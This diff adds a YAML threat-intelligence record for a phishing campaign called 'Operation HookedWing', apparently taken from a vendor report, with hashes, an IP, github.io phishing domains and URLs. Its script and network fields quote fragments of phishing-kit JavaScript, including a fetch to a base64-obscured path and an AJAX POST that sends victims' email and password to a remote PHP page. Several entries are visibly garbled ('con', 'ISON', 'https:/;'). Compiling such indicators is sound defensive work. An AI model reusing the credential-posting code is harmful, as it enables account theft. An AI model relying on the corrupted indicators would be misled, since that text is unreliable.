@@ -1,0 +1,63 @@
+title: 'Operation HookedWing: 4-Year Multi-Sector Phishing Campaign'
+description: The actor has sufficient information not only to access compromised accounts
+  but also to contextualize each victim within their organization and geography, facilitating
+  follow-on access operations or segmented resale of credentials.
+attribution: ''
+malware_families: []
+cves: []
+ttps:
+  processes: []
+  command_lines: []
+  powershell: []
+  scripts:
+  - const __res = await fetch(${window.stef.srv_loc}${atob("L2I3Ym53d2p3bjItMjIucGhw")}",__fetchOptions);const
+    __resData = await _ res.json();// console.log({__resData});
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - https://[Repo].github.io/[Path]/#[User]@[VictimDomain]
+  - https://[AffectedDomain]/genl/[RandomName].php
+  - https://ipdata.co/
+  - https:// com.pk; ->
+  - https:/;  =/inde-s.php ->
+  - 'https://wmat.google. con/s2/faviconscount=counts+1$.ajax({dataType: "ISON",url:
+    https:/;  =/inde-s.php,type: "POST",data:{email:email,password: password,1, ->'
+  file_activity:
+  - cl/up-login. php
+  - srv.js
+  - genl/[Rand].php
+  - genl/[Rand].php
+  persistence: []
+  process_relations: []
+iocs:
+  hashes:
+  - 632705d808341aedb0f8ee2f1fa1e2d0a765e6373379111cb86cb9438407cb25
+  - 557ff81c43c01b13c9743be96a19090aebec31f7104d77ea578b779b99bf4e4e
+  ip_addresses:
+  - 185.192.71.7
+  domains:
+  - '[Repo].github.io'
+  - '[AffectedDomain]'
+  - ipdata.co
+  - excel-file-document-2024.github.io
+  - onedrive1-preview.github.io
+  - archived-document-file-2026.github.io
+  - restriction-de-compte-serveur-2025.github.io
+  - google-file-document[.]github[.]io
+  - file-712[.]github[.]io
+  - excel-file-document-2024[.]github[.]io
+  - pdf-viewer-online[.]github[.]io
+  - microsoft-file[.]github[.]io
+  - onedrive1-preview[.]github[.]io
+  - archived-document-file-2026[.]github[.]io
+  - bc1qxy2kgdygjrsqtzq2n0yrf2493[.]github[.]io
+  - e578eb340bebd4fe6q[.]github[.]io
+  - com.pk
+  - wm. geoiptool . con
+  urls:
+  - hxxps://[Repo].github.io/[Path]/#[User]@[VictimDomain]
+  - hxxps:// com.pk;
+authors: []
+reference: https://socradar.io/blog/operation-hookedwing-4-year-phishing
+date_of_publication: May 07, 2026
+file_creation_date: May 09, 2026
